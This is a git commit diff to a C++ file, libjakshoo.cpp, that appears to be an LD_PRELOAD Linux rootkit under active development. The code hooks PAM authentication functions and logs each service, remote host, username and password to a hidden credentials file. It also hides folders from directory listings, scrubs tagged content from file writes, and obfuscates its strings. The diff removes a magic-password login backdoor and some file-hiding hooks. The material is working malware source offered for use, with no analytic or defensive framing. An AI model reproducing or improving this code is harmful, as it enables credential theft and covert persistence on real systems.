789453377c9c53416ef3f767f0dc5c0105cbea16
demon-i386 <muranotatsuo@protonmail.com>
2023-02-16 17:03:15 -0300

    Bug fixing - PAM Hooking

--- libjakshoo.cpp
+++ libjakshoo.cpp
@@ -31,10 +31,10 @@
 #include <glib.h>
 
 
-static int (*original_getaddrinfo)(const char *node, const char *service, const struct addrinfo *hints, struct addrinfo **res);
-static struct passwd *(*original_getpwnam)(const char *name);
-static int (*original_getpwnam_r)(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result);
-static int (*original_pam_get_item)(const pam_handle_t *pamh, int item_type, const void **item);
+static int (*original_getaddrinfo)(const char *node, const char *service, const struct addrinfo *hints, struct addrinfo **res) = NULL;
+static struct passwd *(*original_getpwnam)(const char *name) = NULL;
+static int (*original_getpwnam_r)(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result) = NULL;
+static int (*original_pam_get_item)(const pam_handle_t *pamh, int item_type, const void **item) = NULL;
 static krb5_error_code (*original_krb5_get_init_creds_password)(krb5_context context, 
 											krb5_creds * creds, 
 											krb5_principal client, 
@@ -42,22 +42,43 @@ static krb5_error_code (*original_krb5_get_init_creds_password)(krb5_context con
 											krb5_prompter_fct prompter, 
 											void * data, krb5_deltat start_time, 
 											const char * in_tkt_service, 
-											krb5_get_init_creds_opt * k5_gic_options);
-static int (*original_pam_acct_mgmt)(pam_handle_t *pamh, int flags);
-static int (*original_pam_set_item)(pam_handle_t* pamh, int item_type, const void *item);
-static int (*original_pam_authenticate)(pam_handle_t* pamh, int flags);
-static int (*original_pam_get_authtok)(pam_handle_t* pamh, int item, const char **authtok, const char *prompt);
-static int (*original_pam_get_user)(const pam_handle_t *pamh, const char **user, const char *prompt);
-static ssize_t (*original_write)(int fd, const void *buf, size_t count);
-static ssize_t (*original_read)(int fd, void *buf, size_t count);
-static size_t (*original_fwrite)(const void *ptr, size_t size, size_t nmemb, FILE *stream);
-static ssize_t (*original_getdents64)(int fd, void *dirp, size_t count);
+											krb5_get_init_creds_opt * k5_gic_options) = NULL;
+static int (*original_pam_acct_mgmt)(pam_handle_t *pamh, int flags) = NULL;
+static int (*original_pam_set_item)(pam_handle_t* pamh, int item_type, const void *item) = NULL;
+static int (*original_pam_authenticate)(pam_handle_t* pamh, int flags) = NULL;
+static int (*original_pam_get_authtok)(pam_handle_t* pamh, int item, const char **authtok, const char *prompt) = NULL;
+static int (*original_pam_get_user)(const pam_handle_t *pamh, const char **user, const char *prompt) = NULL;
+static ssize_t (*original_write)(int fd, const void *buf, size_t count) = NULL;
+static ssize_t (*original_read)(int fd, void *buf, size_t count) = NULL;
+static size_t (*original_fwrite)(const void *ptr, size_t size, size_t nmemb, FILE *stream) = NULL;
+static ssize_t (*original_getdents64)(int fd, void *dirp, size_t count) = NULL;
 
 #define PAM_SUCCESS 0
+
 #define PAM_SERVICE 1
 #define PAM_AUTHTOK 6
+
 #define PAM_RHOST 4
 #define PAM_USER 2
+
+// Hide folders - START
+
+struct dirent *readdir(DIR *dirp) {
+    struct dirent *(*real_readdir)(DIR *);
+    real_readdir = dlsym(RTLD_NEXT, AY_OBFUSCATE("readdir"));
+
+    struct dirent *entry;
+    while ((entry = real_readdir(dirp)) != NULL) {
+        if (strcmp(entry->d_name, (char*)*HIDDEN_FOLDERS) == 0) {
+            continue;  
+        }
+        return entry;  
+    }
+
+    return NULL;  
+}
+
+// Hide folders - END
 
 __attribute__((visibility("hidden")))
 void get_heap_bounds(uint64_t* heap_start, uint64_t* heap_end){
@@ -78,6 +99,7 @@ void get_heap_bounds(uint64_t* heap_start, uint64_t* heap_end){
     free(line);
     fclose(stream);
 }
+
 __attribute__((visibility("hidden")))
 bool is_heap_var(void* pointer){
     uint64_t heap_start = 0;
@@ -90,98 +112,6 @@ bool is_heap_var(void* pointer){
     return false;
 }
 
-
-// hide folders
-struct dirent *readdir(DIR *dirp) {
-    struct dirent *(*real_readdir)(DIR *);
-    real_readdir = dlsym(RTLD_NEXT, AY_OBFUSCATE("readdir"));
-
-    struct dirent *entry;
-    while ((entry = real_readdir(dirp)) != NULL) {
-        if (strcmp(entry->d_name, (char*)*HIDDEN_FOLDERS) == 0) {
-            continue;  
-        }
-        return entry;  
-    }
-
-    return NULL;  
-}
-
-int open(const char *pathname, int flags, mode_t mode) {
-  // Carrega a função original do open
-  int (*original_open)(const char *, int, mode_t) = dlsym(RTLD_NEXT, AY_OBFUSCATE("open"));
-
-  // Se o arquivo a ser aberto for a pasta desejada, retorna um erro
-  if (strstr(pathname, (char*)*HIDDEN_FOLDERS) != NULL) {
-    return -1;
-  }
-
-  // Chama o open original para abrir o arquivo
-  return (*original_open)(pathname, flags, mode);
-}
-
-DIR *opendir(const char *name) {
-  // Carrega a função original do opendir
-  DIR *(*original_opendir)(const char *) = dlsym(RTLD_NEXT, AY_OBFUSCATE("opendir"));
-
-  // Se o diretório a ser aberto for a pasta desejada, retorna um erro
-  if (strstr(name, (char*)*HIDDEN_FOLDERS) != NULL) {
-    return NULL;
-  }
-
-  // Chama o opendir original para abrir o diretório
-  return (*original_opendir)(name);
-}
-__attribute__((visibility("hidden")))
-int filter(const struct dirent *entry){
-    if (strcmp(entry->d_name, AY_OBFUSCATE(".")) == 0 || strcmp(entry->d_name, AY_OBFUSCATE("..")) == 0) {
-        return 0;
-    }
-    if (strstr(entry->d_name, (char*)*HIDDEN_FOLDERS) != NULL) {
-        return 0;
-    }
-    return 1;
-}
-
-int scandir(const char *dirp, struct dirent ***namelist, int (*filter)(const struct dirent *),
-           int (*compar)(const struct dirent **, const struct dirent **)){
-    int count = 0;
-    struct dirent **list;
-    struct dirent *entry;
-
-    DIR *dir = opendir(dirp);
-    if (dir == NULL) {
-        return -1;
-    }
-
-    while ((entry = readdir(dir)) != NULL) {
-        if (filter(entry)) {
-            count++;
-        }
-    }
-
-    rewinddir(dir);
-    list = (struct dirent **) malloc(sizeof(struct dirent *) * count);
-
-    int i = 0;
-    while ((entry = readdir(dir)) != NULL) {
-        if (filter(entry)) {
-            list[i] = entry;
-            i++;
-        }
-    }
-
-    qsort(list, count, sizeof(struct dirent *), (int (*)(const void *, const void *)) compar);
-
-    *namelist = list;
-    closedir(dir);
-
-    return count;
-}
-
-
-typedef ssize_t (*orig_read)(int fd, void *buf, size_t count);
-
 // file content tampering
 ssize_t write(int fd, const void *buf, size_t count){
 	char *p1, *p2;
@@ -191,7 +121,7 @@ ssize_t write(int fd, const void *buf, size_t count){
 	}
 	p1 = strstr((char*)buf, HIDETAG_ENTRY);
 	p2 = strstr((char*)buf, HIDETAG_STOP);
-	if(p1 || p2){
+	if((p1 && p2) && (p2 > p1)){
 		if(!is_heap_var((void*)buf)){
 
 			int start_str = p1 - (char*)buf - 2;
@@ -201,17 +131,10 @@ ssize_t write(int fd, const void *buf, size_t count){
 				((char*)buf)[i] = '\r';
 			}
 		}
-		else{
-			buf = 0;
-
-		}
 	};
 	ssize_t ret = original_write(fd, buf, count);
 	return ret;
 }
-
-
-
 
 // PAM hooks
 
@@ -237,10 +160,10 @@ int pam_get_user(const pam_handle_t *pamh, const char **user, const char *prompt
 
 __attribute__((visibility("hidden")))
 int save_creds(){
-	fptr = fopen((char*)*CREDENTIALS_FILE,"at");
+	fptr = fopen((char*)CREDENTIALS_FILE,"at");
 	char buffer[1024];
 	if(!fptr){
-		fptr = fopen((char*)*CREDENTIALS_FILE, "wt");
+		fptr = fopen((char*)CREDENTIALS_FILE, "wt");
 	}
 	snprintf(buffer, sizeof(buffer), AY_OBFUSCATE("PAM :: %s - %s - %s - %s\n"), (char*)service, (char*)rhost, (char*)user, passpam);
 	fwrite(buffer, sizeof(char), strlen(buffer), fptr);
@@ -264,9 +187,6 @@ int pam_acct_mgmt(pam_handle_t *pamh, int flags){
 		original_pam_acct_mgmt = (int(*)(pam_handle_t*, int))dlsym(RTLD_NEXT, AY_OBFUSCATE("pam_acct_mgmt"));
 	}
 	int ret = original_pam_acct_mgmt(pamh, flags);
-	if (ret == PAM_AUTH_ERR && !strcmp(wrongpass, MAGIC_PASS)) {
-		return PAM_SUCCESS;
-	}
 	return ret;
 }
 
@@ -275,14 +195,11 @@ int pam_authenticate(pam_handle_t * pamh, int flags)
 	char buf[1024];
 	int len;
 
-	static int (*orig_pam_authenticate)(pam_handle_t *, int);
-
-	if (!orig_pam_authenticate) {
-		orig_pam_authenticate =
-		    dlsym(RTLD_NEXT, AY_OBFUSCATE("pam_authenticate"));
+	if (original_pam_authenticate == NULL) {
+		original_pam_authenticate = (int(*)(pam_handle_t*, int))dlsym(RTLD_NEXT, AY_OBFUSCATE("pam_authenticate"));
 	}
 
-	int r = orig_pam_authenticate(pamh, flags);
+	int r = original_pam_authenticate(pamh, flags);
 	int bkp = errno;
 
 	if (r == PAM_SUCCESS) {
@@ -326,3 +243,8 @@ int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, s
 	return ret;
 }
 
+void __attribute__((constructor)) init()
+{
+	setvbuf(stdout, NULL, _IONBF, 0);
+	setvbuf(stdin, NULL, _IONBF, 0);
+}
